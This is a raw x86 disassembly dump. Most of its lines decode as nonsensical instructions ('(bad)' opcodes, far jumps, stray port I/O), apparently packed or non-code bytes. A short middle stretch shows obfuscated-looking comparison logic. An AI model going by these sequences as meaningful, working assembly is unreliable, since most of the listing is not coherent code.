  41df7d:	test   al,0x85
  41df7f:	jb     0x41dfce
  41df81:	lock adc DWORD PTR ds:0x40188f2d,esi
  41df88:	push   esp
  41df89:	loop   0x41dfee
  41df8b:	pop    ebp
  41df8c:	add    dl,BYTE PTR [ebp-0x1ef16f25]
  41df92:	and    BYTE PTR [edi],bh
  41df94:	lea    edx,[ebx]
  41df96:	int3   
  41df97:	xchg   ebp,eax
  41df98:	clc    
  41df99:	jmp    0x567a0d95
  41df9e:	or     BYTE PTR [edi-0x71],bh
  41dfa1:	and    dl,cl
  41dfa3:	(bad)  
  41dfa4:	sar    BYTE PTR [ecx+0x427af019],0x6b
  41dfab:	pop    es
  41dfac:	pop    ebx
  41dfad:	or     BYTE PTR [ebp+edx*4+0x23],cl
  41dfb1:	mov    eax,0x3a38d855
  41dfb6:	outs   dx,BYTE PTR ds:[esi]
  41dfb7:	repz jg 0x41e00b
  41dfba:	cwde   
  41dfbb:	mov    edx,0xa3154b66
  41dfc0:	mov    ch,0x73
  41dfc2:	mov    edi,0x2c99e6c8
  41dfc7:	jae    0x41dfa5
  41dfc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfca:	xchg   DWORD PTR [ecx-0x2d],eax
  41dfcd:	dec    ebx
  41dfce:	fdivr  QWORD PTR [eax]
  41dfd0:	shr    esp,cl
  41dfd2:	dec    esi
  41dfd3:	mov    bl,0x98
  41dfd5:	rol    BYTE PTR [eax+0x5c],0x33
  41dfd9:	pop    ecx
  41dfda:	int    0x7b
  41dfdc:	jbe    0x41dfaa
  41dfde:	and    DWORD PTR [ebx+0x2d],esp
  41dfe1:	arpl   WORD PTR [eax+0xb83b2ac],cx
  41dfe7:	and    ebx,ebp
  41dfe9:	or     DWORD PTR [edx+0x54],0x7c
  41dfed:	jmp    0x143c:0xd5501415
  41dff4:	jp     0x41e036
  41dff6:	dec    ebx
  41dff7:	or     edi,DWORD PTR ds:0x7de95449
  41dffd:	mov    esp,0x39ddc3bf
  41e002:	push   ebx
  41e003:	stos   DWORD PTR es:[edi],eax
  41e004:	jae    0x41dfc4
  41e006:	mov    bh,0x81
  41e008:	icebp  
  41e009:	fld    TBYTE PTR [eax-0x7a88515e]
  41e00f:	call   0xc882:0x2bfb01d4
  41e016:	cmp    al,BYTE PTR [edi]
  41e018:	mov    al,ds:0x4ad3e7db
  41e01d:	ins    BYTE PTR es:[edi],dx
  41e01e:	pop    ebx
  41e01f:	and    BYTE PTR [ebx],bl
  41e021:	aas    
  41e022:	fwait
  41e023:	mov    eax,ds:0x9c4c817b
  41e028:	jle    0x41e01b
  41e02a:	mov    esi,gs
  41e02c:	add    DWORD PTR [ebx+0x2e],edi
  41e02f:	cdq    
  41e030:	xchg   edx,eax
  41e031:	repnz push ebp
  41e033:	repnz sub DWORD PTR [edx],esp
  41e036:	push   ebp
  41e037:	icebp  
  41e038:	js     0x41e034
  41e03a:	jne    0x41dfc2
  41e03c:	push   0xd29ed8a0
  41e041:	dec    edi
  41e042:	mov    bh,0x33
  41e044:	mov    esp,0xc914a0e7
  41e049:	mov    BYTE PTR [esi],dl
  41e04b:	fwait
  41e04c:	or     ch,BYTE PTR [edx+0x11]
  41e04f:	jecxz  0x41e04f
  41e051:	(bad)
  41e055:	mov    ds:0x97c066cd,eax
  41e05a:	fbld   TBYTE PTR [edx]
  41e05c:	cld    
  41e05d:	push   ebx
  41e05f:	outs   dx,BYTE PTR ds:[esi]
  41e060:	fs test al,0x91
  41e063:	add    al,BYTE PTR [ebx-0x7]
  41e066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e067:	cld    
  41e068:	mov    bl,0x7e
  41e06a:	lods   eax,DWORD PTR ds:[esi]
  41e06b:	push   ecx
  41e06c:	and    eax,0x2aa01cb8
  41e071:	pushf  
  41e072:	nop
  41e073:	pop    esi
  41e074:	loopne 0x41e05d
  41e076:	mov    bl,0x4d
  41e078:	je     0x41e08c
  41e07a:	mov    esp,0xbddc0e5d
  41e07f:	pop    ds
  41e080:	or     eax,0xf5ab9b51
  41e085:	les    esi,FWORD PTR [edx]
  41e087:	pop    ebx
  41e088:	xchg   esi,eax
  41e089:	outs   dx,DWORD PTR ds:[esi]
  41e08b:	loop   0x41e043
  41e08d:	xchg   ebx,eax
  41e08e:	mov    dh,0x7e
  41e090:	and    BYTE PTR [eax+0x2e],0x47
  41e094:	and    al,0xec
  41e096:	loopne 0x41e076
  41e098:	inc    edi
  41e099:	mov    esi,0x48eb3900
  41e09f:	and    DWORD PTR [ebp-0x2d8452],eax
  41e0a5:	push   ecx
  41e0a6:	add    edi,0x6763dfe5
  41e0ac:	xlat   BYTE PTR gs:[ebx]
  41e0ae:	cmp    ecx,DWORD PTR [ebx]
  41e0b0:	ret    
  41e0b1:	out    0x50,eax
  41e0b3:	pop    esp
  41e0b4:	leave  
  41e0b5:	pop    ecx
  41e0b6:	or     DWORD PTR [edx-0x1],eax
  41e0b9:	or     DWORD PTR [ebx],edx
  41e0bb:	cdq    
  41e0bc:	dec    esi
  41e0bd:	das    
  41e0be:	arpl   WORD PTR [ecx+0xb],di
  41e0c1:	sub    BYTE PTR [ebx],0xcc
  41e0c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0c5:	(bad)  cs:[esi-0x37]
  41e0c9:	loopne 0x41e052
  41e0cb:	xchg   edi,eax
  41e0cc:	fcomp  DWORD PTR [ecx+0x32]
  41e0cf:	adc    DWORD PTR [edi-0x37],esi
  41e0d2:	imul   ebx,esp,0xffffff84
  41e0d5:	rcr    esi,1
  41e0d7:	fdiv   DWORD PTR [ecx-0x53]
  41e0da:	loope  0x41e074
  41e0dc:	pop    esp
  41e0dd:	push   0x84a386ca
  41e0e2:	or     al,0x72
  41e0e4:	jg     0x41e0bc
  41e0e6:	xor    dh,cl
  41e0e8:	sub    BYTE PTR [esi-0x4e6fcbac],0xc7
  41e0ef:	sub    BYTE PTR [ecx-0x7230e635],0x91
  41e0f6:	xchg   edi,ecx
  41e0f8:	aas    
  41e0f9:	ins    DWORD PTR es:[edi],dx
  41e0fa:	scas   al,BYTE PTR es:[edi]
  41e0fb:	fsubr  DWORD PTR [ebx-0x47]
  41e0fe:	sub    BYTE PTR [eax],0x8f
  41e101:	pop    ebx
  41e102:	dec    ebp
  41e103:	mov    bl,0xf2
  41e105:	fs icebp 
  41e107:	in     al,dx
  41e108:	cmp    al,0xc5
  41e10a:	daa    
  41e10b:	ins    DWORD PTR es:[edi],dx
  41e10c:	je     0x41e0b6
  41e10e:	daa    
  41e10f:	or     al,0xd3
  41e111:	mov    BYTE PTR [esi+0x506cc994],al
  41e117:	rol    edi,cl
  41e119:	inc    esp
  41e11a:	and    al,0x10
  41e11c:	sbb    al,BYTE PTR [edx+0x0]
  41e11f:	add    BYTE PTR [ebx+0x25102444],cl
  41e125:	inc    esp
  41e126:	ret    0xffff
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	test   eax,0xc67e51bd
  41e1f6:	aas    
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1-0x3280e7e8],bh
  41e1ff:	in     eax,dx
  41e200:	test   ebx,0x72c9692a
  41e206:	inc    edx
  41e207:	jns    0x41e1d0
  41e209:	sar    BYTE PTR [esi],1
  41e20b:	ret    
  41e20c:	pushf  
  41e20d:	inc    esp
  41e20e:	lods   eax,DWORD PTR es:[esi]
  41e210:	mov    dl,BYTE PTR [ebx]
  41e212:	jge    0x41e1f6
  41e214:	push   eax
  41e215:	adc    bh,BYTE PTR [edx]
  41e217:	dec    ebp
  41e218:	aad    0x68
  41e21a:	int    0x40
  41e21c:	push   edx
  41e21d:	or     eax,0x9f009039
  41e222:	add    dl,ah
  41e224:	sar    BYTE PTR [esi],cl
  41e226:	sbb    esp,DWORD PTR [esi+edi*1-0x690418f3]
  41e22d:	mov    ah,0x6a
  41e22f:	das    
  41e230:	sbb    eax,0x69c28ac5
  41e235:	sar    DWORD PTR [esi],cl
  41e237:	ret    0x7ce9
  41e23a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e23b:	in     al,dx
  41e23c:	icebp  
  41e23d:	ror    DWORD PTR [ebx+0x53960a7d],1
  41e243:	or     eax,0xe4516c35
  41e248:	xor    esi,eax
  41e24a:	xlat   BYTE PTR ds:[ebx]
  41e24b:	and    DWORD PTR [esp+ecx*1+0x7c],edx
  41e24f:	xor    al,0x6d
  41e251:	popf   
  41e252:	mov    ch,0xd5
  41e254:	cmp    BYTE PTR [eax-0x78],ah
  41e257:	lock mov eax,ds:0x9ad1904d
  41e25d:	call   DWORD PTR [edi]
  41e25f:	jbe    0x41e2da
  41e261:	out    0xef,al
  41e263:	and    ebx,DWORD PTR [ebp+0x356e73dc]
  41e269:	xor    ecx,DWORD PTR [ecx+esi*1]
  41e26c:	mov    esi,0x3c38b5a1
  41e271:	cmp    esp,DWORD PTR [eax]
  41e273:	pop    ss
  41e274:	ds jbe 0x41e21a
  41e277:	in     eax,0xe4
  41e279:	scas   eax,DWORD PTR es:[edi]
  41e27a:	gs push ds
  41e27c:	inc    ebp
  41e27d:	imul   esi,DWORD PTR [ebp-0x45104a5f],0x4b
  41e284:	mov    ebx,0xf294fb49
  41e289:	scas   eax,DWORD PTR es:[edi]
  41e28a:	xor    al,BYTE PTR [ebp+0x12]
  41e28d:	scas   al,BYTE PTR es:[edi]
  41e28e:	and    al,0x85
  41e290:	cmc    
  41e291:	adc    dh,BYTE PTR [ecx+0x34]
  41e294:	mov    ah,0xb9
  41e296:	sbb    eax,DWORD PTR [edx-0x1f]
  41e299:	pusha  
  41e29a:	adc    al,0xf8
  41e29c:	jmp    0x41e2ce
  41e29e:	add    eax,0xc97b54d7
  41e2a3:	popf   
  41e2a4:	jle    0x41e257
  41e2a6:	xchg   ebx,eax
  41e2a7:	jmp    0x3e1c:0xbbe31bf8
  41e2ae:	inc    esi
  41e2af:	cmc    
  41e2b0:	pop    eax
  41e2b1:	or     esp,DWORD PTR [ebx+0x234803d0]
  41e2b7:	fild   QWORD PTR [edi+0x7b]
  41e2ba:	cmp    eax,0x844d700c
  41e2bf:	fdiv   st,st(3)
  41e2c1:	inc    esi
  41e2c2:	sbb    BYTE PTR [eax-0x4cf3e1d8],cl
  41e2c8:	adc    ch,BYTE PTR [ebx+eax*1]
  41e2cb:	rol    DWORD PTR [ebx-0x75b504b8],cl
  41e2d1:	scas   al,BYTE PTR es:[edi]
  41e2d2:	push   ebp
  41e2d3:	sar    BYTE PTR [ebx],0x70
  41e2d6:	pop    ecx
  41e2d8:	pop    es
  41e2d9:	into   
  41e2da:	inc    ebp
  41e2db:	in     eax,0xb9
  41e2dd:	xor    eax,0x94ea2618
  41e2e2:	les    ebx,FWORD PTR [edx]
  41e2e4:	add    cl,ah
  41e2e6:	pop    edx
  41e2e7:	mov    esi,0xfcac6763
  41e2ec:	push   0x3f6fa899
  41e2f1:	inc    edx
  41e2f2:	xchg   ebx,eax
  41e2f3:	mov    DWORD PTR ds:0x1806f257,esi
  41e2f9:	retf   0x1a8d
  41e2fc:	pop    es
  41e2fd:	mov    eax,ds:0x328f49b7
  41e302:	icebp  
  41e303:	xlat   BYTE PTR ds:[ebx]
  41e304:	jp     0x41e2e8
  41e306:	pop    esp
  41e307:	xchg   edi,eax
  41e308:	pop    edi
  41e309:	lea    eax,gs:[esi+0x22]
  41e30d:	or     BYTE PTR [edx],0x53
  41e310:	sub    eax,DWORD PTR [edx]
  41e312:	repnz pop ebx
  41e314:	jns    0x41e29b
  41e316:	jg     0x41e2f1
  41e318:	sbb    eax,0xd23ca662
  41e31d:	add    BYTE PTR [edx-0x43],bh
  41e320:	sub    BYTE PTR [esp+esi*8-0x46],al
  41e324:	sbb    BYTE PTR [eax],0x4b
  41e327:	jns    0x41e376
  41e329:	cld    
  41e32a:	or     al,0x2a
  41e32c:	pop    edx
  41e32d:	add    eax,0x69a6133f
  41e332:	test   al,0xf7
  41e334:	xor    eax,0xa099d120
  41e339:	fisubr WORD PTR [ebp-0x5e]
  41e33c:	xor    cl,BYTE PTR [esi]
  41e33e:	xchg   esp,eax
  41e33f:	pop    esp
  41e340:	pop    edx
  41e341:	outs   dx,DWORD PTR ds:[esi]
  41e342:	pop    ebp
  41e343:	mul    ecx
  41e345:	lock jg 0x41e3ad
  41e348:	(bad)  
  41e349:	pop    ebp
  41e34a:	scas   al,BYTE PTR es:[edi]
  41e34b:	sub    BYTE PTR [edx-0x4fed47c6],bl
  41e351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e352:	xchg   edi,eax
  41e353:	sub    eax,0x15ccb236
  41e358:	repz cwde 
  41e35a:	pop    ebx
  41e35b:	inc    DWORD PTR [edi]
  41e35d:	leave  
  41e35e:	ja     0x41e2ed
  41e360:	in     eax,dx
  41e361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e362:	sbb    ch,BYTE PTR [eax]
  41e364:	ja     0x41e303
  41e366:	stos   DWORD PTR es:[edi],eax
  41e367:	popf   
  41e368:	inc    edi
  41e369:	pop    ecx
  41e36a:	loop   0x41e30a
  41e36c:	and    DWORD PTR [edi],ebp
  41e36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e36f:	sub    al,0xe
  41e371:	jo     0x41e3c2
  41e373:	ins    DWORD PTR es:[edi],dx
  41e374:	xchg   esi,eax
  41e375:	push   esi
  41e376:	cmp    ch,bl
  41e378:	ja     0x41e3f3
  41e37a:	js     0x41e3bc
  41e37c:	sahf   
  41e37d:	and    ch,BYTE PTR [edi]
  41e37f:	jl     0x41e397
  41e381:	push   esp
  41e382:	cld    
  41e383:	push   cs
  41e384:	enter  0xb641,0x7e
  41e388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e389:	lods   al,BYTE PTR ds:[esi]
  41e38a:	xlat   BYTE PTR fs:[ebx]
  41e38c:	test   al,0xf1
  41e38e:	out    dx,al
  41e38f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e390:	ja     0x41e404
  41e392:	xchg   ecx,eax
  41e393:	out    dx,al
  41e394:	fdiv   DWORD PTR [ebx]
  41e396:	mov    cl,0x8a
  41e398:	frstor [ecx+0x1473bc8a]
  41e39e:	ret    0x4f4d
  41e3a1:	pop    ebp
  41e3a2:	push   eax
  41e3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3a4:	push   edx
  41e3a5:	xor    eax,0xa6e2c02
  41e3aa:	in     eax,dx
  41e3ab:	xlat   BYTE PTR ds:[ebx]
  41e3ac:	pop    edx
  41e3ad:	adc    BYTE PTR [esi],bl
  41e3af:	inc    edx
  41e3b0:	xchg   ebx,eax
  41e3b1:	mov    bl,0x6d
  41e3b3:	jno    0x41e36f
  41e3b5:	mov    eax,ds:0x35873e3d
  41e3ba:	xchg   esi,eax
  41e3bb:	adc    BYTE PTR [ebp-0x6d66fcc7],bl
  41e3c1:	out    dx,al
  41e3c2:	add    eax,0x83ae0650
  41e3c7:	ret    
  41e3c8:	add    eax,0x442a9502
  41e3cd:	or     bh,BYTE PTR [edi+0x30850340]
  41e3d3:	xchg   ecx,eax
  41e3d4:	push   ebx
  41e3d5:	pushf  
  41e3d6:	push   es
  41e3d7:	jmp    0xb69d66c1
  41e3dc:	stos   BYTE PTR es:[edi],al
  41e3dd:	cdq    
  41e3de:	idiv   DWORD PTR [ecx+0x1d]
  41e3e1:	loopne 0x41e3b0
  41e3e3:	pop    edx
  41e3e4:	test   BYTE PTR [edx-0x36267b1],ch
  41e3ea:	inc    eax
  41e3eb:	shr    BYTE PTR [edi],0xbc
  41e3ee:	mov    ecx,DWORD PTR [edx+0x173ecf61]
  41e3f4:	adc    DWORD PTR [ebx],ebp
  41e3f6:	pop    eax
  41e3f7:	mov    bh,0x61
  41e3f9:	add    eax,0x96066a1d
  41e3fe:	cwde   
  41e3ff:	pusha  
  41e400:	mov    esi,0x72f82656
  41e405:	in     eax,dx
  41e406:	push   es
  41e407:	push   ebp
  41e408:	inc    ecx
  41e409:	or     dl,BYTE PTR [ebp+0x68ff052]
  41e40f:	push   ds
  41e410:	call   0xdcc56bf7
  41e415:	lahf   
  41e416:	adc    DWORD PTR [edx+0x4],eax
  41e419:	fwait
  41e41a:	ret    
  41e41b:	cmc    
  41e41c:	ror    ebp,1
  41e41e:	in     al,0x96
  41e420:	sbb    DWORD PTR [esi-0x3b86c7ee],ecx
  41e426:	sbb    DWORD PTR [esi+eax*8+0x405c0770],ebx
  41e42d:	call   0x48c8dffb
  41e432:	or     esi,DWORD PTR [eax+0x42ba2927]
  41e438:	push   esp
  41e439:	imul   edx,DWORD PTR [ebx-0x6f7b7982],0x6cdc92c5
  41e443:	aad    0xff
  41e445:	pop    esi
  41e446:	mov    ss,edi
  41e448:	scas   eax,DWORD PTR es:[edi]
  41e449:	pop    ds
  41e44a:	push   ebp
  41e44b:	dec    ebp
  41e44d:	repnz inc edi
  41e44f:	mov    edi,0x51fc0992
  41e454:	fs push esp
  41e456:	inc    esp
  41e457:	push   esi
  41e458:	xchg   esp,eax
  41e459:	adc    esi,DWORD PTR [esi+0x530242c1]
  41e45f:	sbb    edi,DWORD PTR [esi-0x6]
  41e462:	mov    al,dl
  41e464:	scas   eax,DWORD PTR es:[edi]
  41e465:	test   DWORD PTR [ecx],edx
  41e467:	sub    al,0xdd
  41e469:	stos   BYTE PTR es:[edi],al
  41e46a:	xor    ebp,0x5b
  41e46d:	mov    eax,0x1c096d6b
  41e472:	push   esi
  41e473:	retf   0x7eb2
  41e476:	push   ss
  41e477:	or     dh,cl
  41e479:	cmc    
  41e47a:	cwde   
  41e47b:	pop    ss
  41e47c:	cmp    bh,BYTE PTR [edx-0x7e5f9f9]
  41e482:	cmp    edx,DWORD PTR [ecx]
  41e484:	adc    edi,DWORD PTR [esp+edx*4-0x10]
  41e488:	dec    eax
  41e489:	or     cl,BYTE PTR [edi+ecx*8+0x19]
  41e48d:	out    0x5c,al
  41e48f:	sub    DWORD PTR [ebp-0x280ce2dc],esi
  41e495:	dec    esp
  41e496:	fcom   st(6)
  41e498:	mov    ch,0x41
  41e49a:	xchg   ecx,eax
  41e49b:	out    dx,eax
  41e49c:	ret    0x4bf4
  41e49f:	test   eax,edi
  41e4a1:	mov    ds:0x11ee6355,eax
  41e4a6:	mov    eax,0x29c394e6
  41e4ab:	xchg   BYTE PTR [ebp-0x5048e53d],bh
  41e4b1:	pop    esp
  41e4b2:	jb     0x41e4f9
  41e4b4:	cmp    ah,dl
  41e4b6:	test   dl,ah
  41e4b8:	loope  0x41e46f
  41e4ba:	popa   
  41e4bb:	sub    al,ah
  41e4bd:	dec    edx
  41e4be:	imul   ecx,DWORD PTR [esi-0x4e],0x162aea02
  41e4c5:	dec    ecx
  41e4c6:	lock sub esp,esp
  41e4c9:	ins    BYTE PTR es:[edi],dx
  41e4ca:	stos   DWORD PTR es:[edi],eax
  41e4cb:	scas   eax,DWORD PTR es:[edi]
  41e4cc:	(bad)  
  41e4cd:	scas   al,BYTE PTR es:[edi]
  41e4ce:	jp     0x41e52a
  41e4d0:	push   eax
  41e4d1:	dec    edi
  41e4d2:	cmp    DWORD PTR [eax-0x6f],eax
  41e4d5:	pop    edi
  41e4d6:	fisttp DWORD PTR [esi+esi*4]
  41e4d9:	sbb    al,0xc4
  41e4db:	repz int3 
  41e4dd:	enter  0x4960,0x3e
  41e4e1:	dec    eax
  41e4e2:	jmp    0x41e4a7
  41e4e4:	fldenv [edx+0x1]
  41e4e7:	xchg   esi,eax
  41e4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4e9:	sub    eax,0xe3685a5b
  41e4ee:	pop    esp
  41e4ef:	mov    DWORD PTR [ebx+0x529b14fd],esp
  41e4f5:	sub    al,0xa7
  41e4f7:	cmpxchg BYTE PTR [ecx],dl
  41e4fa:	cli    
  41e4fb:	sub    cl,dh
  41e4fd:	(bad)  
  41e4fe:	push   ds
  41e4ff:	call   0x883d8478
  41e504:	cli    
  41e505:	call   0x852b03f4
  41e50a:	icebp  
  41e50b:	icebp  
  41e50c:	jp     0x41e538
  41e50e:	lods   al,BYTE PTR ds:[esi]
  41e50f:	sub    dh,BYTE PTR [edx]
  41e511:	in     eax,0x28
  41e513:	xchg   DWORD PTR [ebp+0x73a61b3f],ecx
  41e519:	call   0xf056:0xdfb0857a
  41e520:	fmul   DWORD PTR [eax-0x7db44271]
  41e526:	out    dx,eax
  41e527:	js     0x41e58f
  41e529:	or     BYTE PTR [ebx-0x4c],bh
  41e52c:	clc    
  41e52d:	jo     0x41e557
  41e52f:	dec    ebx
  41e530:	jmp    0xcdaa5b0a
  41e535:	mov    edx,0xfc33c0d6
  41e53a:	inc    esp
  41e53b:	push   edx
  41e53c:	scas   eax,DWORD PTR es:[edi]
  41e53d:	lea    eax,[ecx+0x54654b05]
  41e543:	dec    ecx
  41e544:	or     al,BYTE PTR [esi-0x77]
  41e547:	sahf   
  41e548:	loop   0x41e57e
  41e54a:	lea    edi,[ecx+0x7c3249cd]
  41e550:	fmul   st(6),st
  41e552:	inc    esi
  41e553:	loopne 0x41e509
  41e555:	xor    eax,0xd46fdbdf
  41e55a:	popa   
  41e55b:	inc    edx
  41e55c:	and    BYTE PTR [ebx-0x63039875],al
  41e562:	pop    ecx
  41e563:	push   eax
  41e564:	out    dx,al
  41e565:	mov    ds:0x22c72652,al
  41e56a:	cmp    BYTE PTR [eax+0x128d2d16],dh
  41e570:	push   ecx
  41e571:	fmulp  st(1),st
  41e573:	push   cs
  41e574:	sbb    al,0xe5
  41e576:	repz out dx,al
  41e578:	int3   
  41e579:	fs aas 
  41e57b:	loop   0x41e5cd
  41e57d:	out    dx,eax
  41e57e:	rol    BYTE PTR [edx-0x79],cl
  41e581:	xor    ecx,DWORD PTR [ebp-0x4b]
  41e584:	retf   
  41e585:	push   ecx
  41e586:	or     edx,edx
  41e588:	adc    BYTE PTR [edi-0x1b],cl
  41e58b:	test   BYTE PTR [ebx-0x2563c2b1],0x8d
  41e592:	jae    0x41e5f9
  41e594:	jle    0x41e536
  41e596:	jo     0x41e549
  41e598:	jecxz  0x41e60b
  41e59a:	xor    al,BYTE PTR [ebx+ebp*4-0x4e]
  41e59e:	sbb    ebp,esi
  41e5a0:	scas   eax,DWORD PTR es:[edi]
  41e5a1:	ret    
  41e5a2:	and    esi,edx
  41e5a4:	mov    ds:0xd0c2743f,eax
  41e5a9:	rcr    DWORD PTR [esi+0x5e],0x1b
  41e5ad:	jmp    0xc10b:0x2e0c1cf
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x38aae715
  41e5c6:	and    BYTE PTR ds:0x16376bbe,ch
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x3f411818],bh
  41e5d3:	pop    esi
  41e5d4:	imul   bl
  41e5d6:	or     al,0xf8
  41e5d8:	add    esi,DWORD PTR [ebx+0x38]
  41e5db:	sub    edi,DWORD PTR [eax+0x62]
  41e5de:	imul   esi,DWORD PTR [eax+0x23f1b6e0],0xa5d71827
  41e5e8:	jo     0x41e5df
  41e5ea:	in     eax,0xaf
  41e5ec:	test   eax,0x9d99917
  41e5f1:	out    dx,eax
  41e5f2:	sub    DWORD PTR [esi+0x4b],edx
  41e5f5:	enter  0xe807,0x67
  41e5f9:	stc    
  41e5fa:	adc    al,0xa6
  41e5fc:	(bad)  
  41e5fd:	nop
  41e5fe:	dec    edx
  41e5ff:	inc    ebx
  41e600:	adc    eax,0x1c6c2aa2
  41e605:	aam    0xe5
  41e607:	leave  
  41e608:	rol    BYTE PTR [edx-0x1d6c5b11],1
  41e60e:	jb     0x41e5d4
  41e610:	popa   
  41e611:	jge    0x41e5b4
  41e613:	popf   
  41e614:	stc    
  41e615:	enter  0xd737,0x60
  41e619:	add    al,0xb3
  41e61b:	cld    
  41e61c:	fstp   DWORD PTR [ebx-0x4e]
  41e61f:	and    eax,0x5fe6557b
  41e624:	retf   0xe42a
  41e627:	adc    edx,DWORD PTR [ebp-0x4718e1ba]
  41e62d:	out    dx,al
  41e62e:	xchg   BYTE PTR [ecx-0x263aba92],bh
  41e634:	sbb    eax,DWORD PTR [edx-0xda536b1]
  41e63a:	jmp    0x8b2f:0x291943fa
  41e641:	sti    
  41e642:	add    BYTE PTR [edi-0x13b443b5],dh
  41e648:	push   ebx
  41e649:	mov    eax,0x6feea638
  41e64e:	(bad)
  41e652:	aad    0xad
  41e654:	push   0xec4c71dc
  41e659:	inc    esi
  41e65a:	mov    esp,0x401e720
  41e65f:	add    BYTE PTR ds:0x5e944b3d,al
  41e665:	rcl    BYTE PTR [edx],cl
  41e667:	mov    ds:0x71f5ecd7,eax
  41e66c:	loop   0x41e6a0
  41e66e:	add    bl,BYTE PTR [ebp+ecx*1-0x68241c1d]
  41e675:	pushf  
  41e676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e677:	cld    
  41e678:	mov    ecx,0xbb0312e1
  41e67d:	mov    dl,BYTE PTR [ecx+eax*2-0x6b]
  41e681:	(bad)  
  41e682:	test   al,0xaa
  41e684:	and    DWORD PTR [edi+0x75a51537],esp
  41e68a:	arpl   WORD PTR [edx+0x7c],bx
  41e68d:	xor    dl,BYTE PTR [esi+0x74]
  41e690:	aam    0xdd
  41e692:	clc    
  41e693:	loop   0x41e66c
  41e695:	jmp    0x41e679
  41e697:	scas   al,BYTE PTR es:[edi]
  41e698:	mov    edi,0xb7b20363
  41e69d:	jmp    0xf668:0xb8aea72a
  41e6a4:	or     BYTE PTR ds:0xef10397c,bh
  41e6aa:	or     DWORD PTR [edx],eax
  41e6ac:	iret   
  41e6ad:	in     eax,0x31
  41e6af:	inc    ebp
  41e6b0:	mov    dh,0xfa
  41e6b2:	mov    ebx,0xbf0345a7
  41e6b7:	gs add al,0xd5
  41e6ba:	jne    0x41e662
  41e6bc:	adc    DWORD PTR [eax],ebx
  41e6be:	and    al,0xac
  41e6c0:	inc    esi
  41e6c1:	cs xor al,0x12
  41e6c4:	(bad)  
  41e6c5:	adc    BYTE PTR [edi],bl
  41e6c7:	enter  0x2685,0x1f
  41e6cb:	loope  0x41e6f2
  41e6cd:	imul   esp,DWORD PTR [ecx-0x827a587],0xffffff89
  41e6d4:	(bad)  
  41e6d5:	jl     0x41e6a3
  41e6d7:	rol    esi,0x45
  41e6da:	fcmovne st,st(2)
  41e6dc:	jl     0x41e74e
  41e6de:	shl    bl,1
  41e6e0:	inc    esp
  41e6e1:	jp     0x41e696
  41e6e3:	ds (bad) 
  41e6e6:	hlt    
  41e6e7:	xor    BYTE PTR cs:[ebp+0x3b],dh
  41e6eb:	push   ebp
  41e6ec:	repnz (bad) 
  41e6ee:	xchg   esi,eax
  41e6ef:	mov    ds:0x3bef2be4,al
  41e6f4:	bound  ebp,QWORD PTR [ebx]
  41e6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f7:	adc    bl,BYTE PTR [edi+0x20c06e4d]
  41e6fd:	and    ebp,0xffffff9b
  41e700:	push   ecx
  41e701:	mov    dh,BYTE PTR [eax-0x70]
  41e704:	fiadd  DWORD PTR ds:0x73d725a9
  41e70a:	xchg   edx,eax
  41e70b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e70c:	(bad)  
